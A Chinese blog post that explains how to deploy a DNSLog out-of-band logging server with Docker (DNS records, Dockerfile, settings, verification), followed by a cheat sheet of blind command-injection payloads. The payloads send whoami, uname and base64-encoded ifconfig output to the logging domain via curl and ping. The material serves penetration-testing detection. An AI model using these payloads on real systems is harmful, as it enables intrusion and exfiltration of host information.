Title:使用docker搭建dnslog服务器：python版开源cloudeye的部署
Date: 2018-01-04 10:20
Category: 工具相关
Tags: dnslog,docker
Slug: 
Authors: bit4
Summary: python版开源cloudeye的部署



本文档主要记录使用docker搭建dnslog的过程。使用如下项目版本，基于[原版](https://github.com/BugScanTeam/DNSLog)做了一些修改：

https://github.com/bit4woo/DNSLog

感谢[草粉师傅](https://github.com/coffeehb)的帮助

### 0x0、域名和配置

搭建并使用 DNSLog，需要拥有两个域名：

1. 一个作为 NS 服务器域名(例:code2sec.com)：在其中设置两条 A 记录指向我们的公网 IP 地址（无需修改DNS服务器，使用运营商默认的就可以了）：

```
ns1.code2sec.com  A 记录指向  10.11.12.13
ns2.code2sec.com  A 记录指向  10.11.12.13
```

2. 一个用于记录域名(例: 0v0.com)：修改 0v0.com 的 NS 记录为 1 中设定的两个域名（无需修改DNS服务器，使用运营商默认的就可以了）：

```
NS	*.0v0.com	ns1.code2sec.com
NS	*.0v0.com	ns2.code2sec.com
```

<u>注意：按照dnslog的说明是修改NS记录，但是自己的部署中修改了好几天之后仍然不正常，就转为修改DNS服务器，而后成功了。修改DNS服务器之后就无需在域名管理页面设置任何DNS记录了，因为这部分是在DNSlog的python代码中实现的。</u>

![changeNameServer](img/docker+dnslog/changeNameServer.png)

### 0x1、docker镜像构造

dockerfile内容如下

```dockerfile
FROM ubuntu:14.04

RUN sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list

RUN apt-get update -y && apt-get install -y python && apt-get install python-pip -y && apt-get install git -y
RUN git clone https://github.com/bit4woo/DNSLog
WORKDIR /DNSLog/dnslog
RUN pip install -r requirements.pip

COPY ./settings.py /DNSLog/dnslog/dnslog/settings.py

COPY ./start.sh /DNSLog/dnslog/start.sh
RUN chmod +x start.sh
CMD ["./start.sh"]

EXPOSE 80
```

下载 `dnslog/dnslog/settings.py`并对如下字段进行对应的修改，保存settings.py：

```python
# 做 dns 记录的域名
DNS_DOMAIN = '0v0.com'

# 记录管理的域名, 这里前缀根据个人喜好来定
ADMIN_DOMAIN = 'admin.0v0.com'

# NS域名
NS1_DOMAIN = 'ns1.code2sec.com'
NS2_DOMAIN = 'ns2.code2sec.com'

# 服务器外网地址
SERVER_IP = '10.11.12.13'
```

创建一个dnslog的启动脚本，保存为start.sh：

```bash
#!/bin/bash
python manage.py runserver 0.0.0.0:80
```

准备好如上3个文件后，可以构建镜像了

```bash
docker build .
docker tag e99c409f6585 bit4/dnslog
docker run -d -it -p 80:80 -p 53:53/udp bit4/dnslog
#注意这个53udp端口，感谢CF_HB师傅的指导

docker exec -it container_ID_or_name /bin/bash
./start.sh
```



### 0x2、配置验证

使用nslookup命令进行验证，如果可以直接测试xxx.test.0v0.com了，说明所有配置已经全部生效；如果直接查询失败，而指定了dns服务器为 ns1.code2sec.com查询成功，说明dns服务器配置正确了，但是ns记录的设置需要等待同步或者配置错误。

```
nslookup
xxx.test.0v0.com
server ns1.code2sec.com
yyy.test.0v0.com
```

当然，在查询的同时可以登录网页端配合查看，是否收到请求。

在我自己的部署中，发现修改ns记录很久后仍然不能直接查询到 xxx.test.0v0.com，想到NS记录配置和DNS服务器设置都是修改解析的域名的服务器配置，就尝试修改了DNS服务器为 ns1.code2sec.com, 结果就一切正常了。



### 0x3、管理网站

后台地址：http://0v0.com/admin/  admin admin

用户地址：http://admin.0v0.com/ test 123456

更多详细问题参考项目https://github.com/BugScanTeam/DNSLog

**记得修改默认的账号密码！**



### 0x4、payload使用技巧

用||兼容windows和linux

```bash
ipconfig || ifconfig
#||是或逻辑， 如果第一个命令执行成功，将不会执行第二个；而如果第一个执行失败，将会执行第二个。

使用实例：
ping -n 3 xxx.test.0v0.com || ping -c 3 xxx.test.0v0.com
```



命令优先执行

```bash
%OS%
#windows的系统变量，用set命令可以查看所有可用的变量名称
`whomai` 
#linux下的命令优先执行,注意是反引号（`）这个字符一般在键盘的左上角，数字1的左边

测试效果如下:
root@ubuntu:~# echo `whoami`@bit4
root@bit4

E:\>echo %OS%@bit4
Windows_NT@bit4

使用实例：
curl "http://xxx.test.0v0.com/?`whoami`"
ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
#DNS记录中获取源IP地址
```

![command_first](img/docker+dnslog/command_first.png)

消除空格

```bash
id|base64

使用实例：
curl test.0v0.com/`ifconfig|base64 -w 0` 
#-w 0 输出内容不换行，推荐这个方法
curl test.0v0.com/`ifconfig |base64 |tr -d '\n'`
#相同的效果
```

![base64](img/docker+dnslog/base64.png)

window下的curl

```bash
start http://xxxxxxxxx.test.0v0.com
#该命令的作用是通过默认浏览器打开网站，缺点是会打开窗口
```



### 0x5、常用payload汇总



```bash
#1.判断系统类型
ping `uname`.0v0.com || ping %OS%.0v0.com

#2.通用ping，dns类型payload
ping -n 3 xxx.0v0.com || ping -c 3 xxx.0v0.com

C:\Windows\System32\cmd.exe /c "ping -n 3 test.com || ping -c 3 test.com"
/bin/bash -c "ping -n 3 test.com || ping -c 3 test.com"


======================================分割线=====================================


#3.从DNS记录中获取源IP地址
ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com

#4.获取命令结果
curl test.0v0.com/`ifconfig|base64 -w 0`

```

